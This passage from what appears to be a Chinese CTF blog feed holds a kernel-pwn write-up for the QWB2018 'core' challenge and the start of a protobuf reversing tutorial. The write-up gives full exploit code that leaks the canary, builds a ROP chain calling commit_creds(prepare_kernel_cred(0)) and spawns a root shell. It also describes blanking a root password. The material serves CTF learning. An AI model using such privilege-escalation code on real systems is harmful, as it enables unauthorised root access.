BuildID[sha1]=549436d</span></span><br><span class="line"><span class="comment">   [*] &#x27;/home/m4x/pwn_repo/QWB2018_core/give_to_player/core.ko&#x27;</span></span><br><span class="line"><span class="comment">       Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">       RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">       Stack:    Canary found</span></span><br><span class="line"><span class="comment">       NX:       NX enabled</span></span><br><span class="line"><span class="comment">       PIE:      No PIE (0x0)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);            <span class="comment">//打开符号表，获取各符号偏移</span></span><br><span class="line">    <span class="comment">/* FILE* kallsyms_fd = fopen(&quot;./test_kallsyms&quot;, &quot;r&quot;); */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, kallsyms_fd))        <span class="comment">//48条项目一组，一直找commit_creds和prepare_kernel_cred符号的地址</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);                  <span class="comment">//地址在前16个字节</span></span><br><span class="line">            <span class="comment">/* printf(&quot;hex: %s\n&quot;, hex); */</span></span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);     <span class="comment">//以llx模式解析16个字节，正确解析出地址</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * give_to_player [master●●] bpython</span></span><br><span class="line"><span class="comment">                bpython version 0.17.1 on top of Python 2.7.15 /usr/bin/n</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; from pwn import *</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; vmlinux = ELF(&quot;./vmlinux&quot;)</span></span><br><span class="line"><span class="comment">                [*] &#x27;/home/m4x/pwn_repo/QWB2018_core/give_to_player/vmli&#x27;</span></span><br><span class="line"><span class="comment">                    Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">                    RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">                    Stack:    Canary found</span></span><br><span class="line"><span class="comment">                    NX:       NX disabled</span></span><br><span class="line"><span class="comment">                    PIE:      No PIE (0xffffffff81000000)</span></span><br><span class="line"><span class="comment">                    RWX:      Has RWX segments</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; hex(vmlinux.sym[&#x27;commit_creds&#x27;] - 0xffffffff81000000)</span></span><br><span class="line"><span class="comment">                &#x27;0x9c8e0&#x27;</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">            <span class="comment">/* printf(&quot;vmlinux_base addr: %p\n&quot;, vmlinux_base); */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">int</span> fd, <span class="type">long</span> <span class="type">long</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]set off to %ld\n&quot;</span>, idx);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]read to buf.&quot;</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">int</span> fd, <span class="type">long</span> <span class="type">long</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]copy from user with size: %ld\n&quot;</span>, size);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889A</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);         <span class="comment">//以读写模式打开</span></span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="comment">// gadget = raw_gadget - raw_vmlinux_base + vmlinux_base;</span></span><br><span class="line">    <span class="type">ssize_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line"></span><br><span class="line">    set_off(fd, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    core_read(fd, buf);</span><br><span class="line">    <span class="type">size_t</span> canary = ((<span class="type">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)spawn_shell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">    core_copy_func(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>其中获取<strong>commit_creds</strong>等内核符号相对基址偏移的方式如下，得到偏移后，我们只要在运行exp时读取<strong>/tmp/kallsyms</strong>得到符号的真实地址，然后减去偏移之后就能得到<strong>虚拟地址符号基址</strong>。而且没有开启PIE保护下，我们可以看到内核映像默认加载基地址。这个地址是内核映像在物理内存中的加载地址，表示内核的起始位置。而<strong><code>/proc/kallsyms</code>
中的符号地址</strong>
是内核符号（如函数名、变量名等）在内核虚拟地址空间中的位置。由于 Linux
内核会进行地址空间布局随机化（ASLR），即使内核的物理地址是固定的，它在虚拟地址空间中的位置可能会有所不同。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117153339477.png"
                      class=""
                >
<p>首先我们先保存cs，rflags等信息，以便以后返回用户态。然后打开我们的内核模块core.ko中所注册的/proc/core获得一个文件描述符，那么之后就可以利用ioctl进行操作。然后我们就可以获取到核心的<strong>commit_creds</strong>和<strong>prepare_kernel_cred</strong>地址。我们的目标是调用<strong>commit_creds(prepare_kernel_cred(0));</strong>进行提权。各函数的具体实现可以看exp中的具体代码，还是比较简单的。因为我们找到的gadget等地址都是固定的物理地址空间的地址，我们想要的是虚拟空间地址，所以还要算出相对偏移。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">save_status();</span><br><span class="line"><span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);         <span class="comment">//以读写模式打开</span></span><br><span class="line"><span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">find_symbols();</span><br><span class="line"><span class="comment">// gadget = raw_gadget - raw_vmlinux_base + vmlinux_base;</span></span><br><span class="line"><span class="type">ssize_t</span> offset = vmlinux_base - raw_vmlinux_base;		<span class="comment">//虚拟地址空间相对于物理地址空间偏移</span></span><br></pre></td></tr></table></figure></div>
<p>之后最核心的就是与注册的core设备进行交互，具体实现采用的是ioctl方式，每个函数对应之前IDA中所看到的内核模块的功能。但我们能发现core.ko中<strong>core_ioctl</strong>函数中只会调用<strong>core_read</strong>和<strong>core_copy_func</strong>，而没有<strong>core_write</strong>的调用。其实我们也可以在用户态直接<strong>write(fd,
buf, len);</strong>来调用到这个函数（fd为该设备的描述符）。</p>
<p>首先是泄露canary，我们从IDA就可以看出canary相距v4有0x40个字节。<code>copy_to_user(a1, &amp;v4[off], 64LL)</code>又能直接读出64个字节到用户空间，那么只要我们先把全局变量<strong>off</strong>设置为0x40，然后再用<strong>core_read</strong>函数，就能够将从canary开始的64个字节读取出来。也就泄露了canary。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">set_off(fd, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">core_read(fd, buf);</span><br><span class="line"><span class="type">size_t</span> canary = ((<span class="type">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary);</span><br></pre></td></tr></table></figure></div>
<p>这里我们可以动调一下先看看，gdb从vmlinux启动，然后把core.ko作为symbol
file附加上，之后就能在想要的位置处下断点了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117165103393.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117170701255.png"
                      class=""
                >
<p>那么我们先把exp编译出来，然后重新打包文件系统，再次启动在虚拟环境下运行exp，就能用gdb进行调试。这里比如我们在<strong>core_ioctl</strong>下断点。能够成功在这里断下来。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117171647372.png"
                      class=""
                >
<p>之后我们看<strong>core_read</strong>这个具体的过程，会发现<strong>copy_to_user</strong>执行完后，rbx指向了用户态的栈区域，也成功的把内核态中的canary以及之后的64个字节复制到了用户态的栈中。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117232044372.png"
                      class=""
                >
<p>然后就是写ROP，用的是ropper找出的gadget。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ropper --file ./vmlinux --nocolor &gt; g1</span><br><span class="line"><span class="built_in">cat</span> g1 | grep <span class="string">&#x27;pop rdi; ret&#x27;</span>  </span><br><span class="line">......</span><br></pre></td></tr></table></figure></div>
<p>这里rop链中<code>mov rdi,rax</code>可以把<code>prepare_kernel_cred(0)</code>返回的内容作为参数传入<code>commit_creds</code>中，因为gadget中的<code>mov rdi,rax</code>后面还会call
rdx，所以前两个pop ret都是为了抵消call rdx的作用的。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)spawn_shell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">    core_copy_func(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br></pre></td></tr></table></figure></div>
<p>执行完<strong>core_copy_func</strong>后，就成功把rop链写在了内核的栈上</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250118001545125.png"
                      class=""
                >
<p>之后我们重点看看返回用户态所用的<strong>swapgs</strong>，<strong>popfq</strong>，<strong>iretq</strong>具体做了什么。</p>
<p>首先swapgs会切换gs寄存器，先后对比如下。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250118003618379.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250118003632606.png"
                      class=""
                >
<p>而<strong>popfq</strong>会把栈上弹出一个内容复制给e/rflags寄存器，先后对比如下。但这个并不重要，因为后面的ireq还会恢复e/rflags寄存器，所以这里的<strong>popfq</strong>只是gadget中<strong>swapgs</strong>的副作用。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250118004009402.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250118004050999.png"
                      class=""
                >
<p>而<strong>iretq</strong>则相当于先返回到当前栈顶地址处（用户态空间），然后依次从栈上弹出4个内容赋给cs，e/rflags，sp，以及ss。我们在函数一开始调用<strong>save_status</strong>就是为了这时候还原。</p>
<p>然后我们就返回了root权限的shell，要测试提权是否成功，我们现在回到init中把<code>setsid /bin/cttyhack setuidgid 0 /bin/sh</code>中的0改回1000，然后重新打包并启动，运行exp看看效果。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250118005531726.png"
                      class=""
                >
<p>成功提权。</p>
<h5 id="dsbctf-easykernel">DSBCTF-EasyKernel</h5>
<p>给了3个文件。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250119171402051.png"
                      class=""
                >
<p>先解压文件系统。然后在run.sh中加入<code>-s</code>启用gdb调试。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">cpio -idmv &lt; rootfs.cpio</span><br></pre></td></tr></table></figure></div>
<p>这里我们缺vmlinux，可以用源码中的extract-vmlinux脚本来从bzImage中提取vmlinux。然后再用vmlinux-to-elf
工具恢复符号表。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">/mnt/e/ctf/kernel/linux-5.15.153/scripts/extract-vmlinux ./bzImage&gt; vmlinux</span><br><span class="line">vmlinux-to-elf ./vmlinux ./vmlinux_</span><br></pre></td></tr></table></figure></div>
<p>尝试启动时发现不是进入shell环境，而是要求进行登录。实际上，我们通过查看解压出的文件系统，可以发现/etc/inittab这个文件。这说明系统使用getty进行登录。我们通过查看etc/passwd文件的内容，很容易就能得到用户名为ctfshow，而密码加密后存在etc/shadow里，这个我们一般猜不到，这里我们尝试弱口令爆破，得到密码就为<strong>ctfshow</strong>，之后就能进入shell环境。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250119180323832.png"
                      class=""
                >
<p>因为这题采用的是登录式，我们如果想要以root权限登录方便调试，就要先改/etc/shadow文件的root密码。这里我们直接清空这个root用户的密码。即改成<code>root::::::::</code>。之后我们用ctfshow用户登录进去后，就可以自由切换到root用户。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250120000054782.png"
                      class=""
                >
<p>对于run.sh以及init文件的分析在上文已经作为例子提及了，这里直接看提供的模块<strong>ctfshow.ko</strong>。</p>
<p>首先看<strong>init_module</strong>，注册了kqueue这个设备，之后可以靠kqueue_ioctl来进行交互。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250119172615036.png"
                      class=""
                >
<h4 id="参考资料">参考资料</h4>
<p>https://ctf-wiki.org/pwn/linux/kernel-mode/basic-knowledge/</p>
<p>https://sky123.blog.csdn.net/article/details/130815994?sharetype=blogdetail&amp;sharerId=130815994&amp;sharerefer=WAP&amp;sharesource=</p>
<p>https://blog.csdn.net/qq_45323960/article/details/130815994</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>protobuf初探</title>
    <url>/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h4 id="protobuf简介">protobuf简介</h4>
<p>Protocol
Buffers（通常简称为protobuf）是由Google开发的一种语言中立、平台中立的序列化结构数据的方法。它用于高效地存储和交换数据，特别适合用于网络通信和数据存储。protobuf的主要特点包括：</p>
<ol type="1">
<li><strong>高效性</strong>：protobuf使用紧凑的二进制格式，比其他文本格式（如JSON或XML）更小、更快。</li>
<li><strong>语言中立</strong>：支持多种编程语言，包括C++、Java、Python、Go等，使得跨平台的数据交换变得简单。</li>
<li><strong>易于扩展</strong>：可以在不破坏现有数据结构的情况下，轻松地添加新字段。</li>
<li><strong>定义文件</strong>：使用<code>.proto</code>文件来定义数据结构和服务，可以通过工具自动生成相应的代码。</li>
</ol>
<p>通过protobuf，开发者可以定义消息类型，使用这些类型进行数据序列化和反序列化，从而在不同的系统或服务之间传输数据。</p>
<p><strong>Proto2</strong>: 支持 <code>required</code> 和
<code>optional</code> 修饰符。</p>
<p><strong>Proto3</strong>: 默认所有字段为 <code>optional</code>，不支持
<code>required</code></p>
<h4 id="工具集安装">工具集安装</h4>
<ul>
<li>pbtk:（自动化分析）</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install python3-pip git openjdk-11-jre libqt5x11extras5 python3-pyqt5.qtwebengine python3-pyqt5</span><br><span class="line">sudo pip3 install protobuf pyqt5 pyqtwebengine requests websocket-client</span><br><span class="line">git clone https://github.com/marin-m/pbtk</span><br></pre></td></tr></table></figure></div>
<ul>
<li>Protobuf 库:（本地搓proto文件并编译成python）</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y protobuf-compiler libprotobuf-dev		</span><br><span class="line">sudo apt-get install libprotobuf-c-dev protobuf-c-compiler</span><br></pre></td></tr></table></figure></div>
<h4 id="目标">目标</h4>
<p>protobuf这类题一般都会将输入转化成特殊的结构体，这就要求我们首先要逆向出proto结构体。</p>
<h4 id="一些结构体定义">一些结构体定义</h4>
<h6 id="protobufcfielddescriptor">ProtobufCFieldDescriptor</h6>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026151257848.png"
                      class=""
                >
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCFieldDescriptor</span> &#123;</span></span><br><span class="line">    <span class="comment">/** Name of the field as given in the .proto file. */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>      *name;				</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Tag value of the field as given in the .proto file. */</span></span><br><span class="line">    <span class="type">uint32_t</span>        id;					</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Whether the field is `REQUIRED`, `OPTIONAL`, or `REPEATED`. */</span></span><br><span class="line">    ProtobufCLabel      label;					</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The type of the field. */</span></span><br><span class="line">    ProtobufCType       type;					</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The offset in bytes of the message&#x27;s C structure&#x27;s quantifier field</span></span><br><span class="line"><span class="comment">     * (the `has_MEMBER` field for optional members or the `n_MEMBER` field</span></span><br><span class="line"><span class="comment">     * for repeated members or the case enum for oneofs).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span>        quantifier_offset;							</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The offset in bytes into the message&#x27;s C structure for the member</span></span><br><span class="line"><span class="comment">     * itself.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span>        offset;					</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A type-specific descriptor.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the</span></span><br><span class="line"><span class="comment">     * corresponding `ProtobufCEnumDescriptor`.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to</span></span><br><span class="line"><span class="comment">     * the corresponding `ProtobufCMessageDescriptor`.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Otherwise this field is NULL.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">void</span>      *descriptor; <span class="comment">/* for MESSAGE and ENUM types */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The default value for this field, if defined. May be NULL. */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">void</span>      *default_value;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A flag word. Zero or more of the bits defined in the</span></span><br><span class="line"><span class="comment">     * `ProtobufCFieldFlag` enum may be set.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">uint32_t</span>        flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Reserved for future use. */</span></span><br><span class="line">    <span class="type">unsigned</span>        reserved_flags;</span><br><span class="line">    <span class="comment">/** Reserved for future use. */</span></span><br><span class="line">    <span class="type">void</span>            *reserved2;</span><br><span class="line">    <span class="comment">/** Reserved for future use. */</span></span><br><span class="line">    <span class="type">void</span>            *reserved3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<h6 id="label和type">label和type</h6>
<p>label和type都是枚举类型：</p>
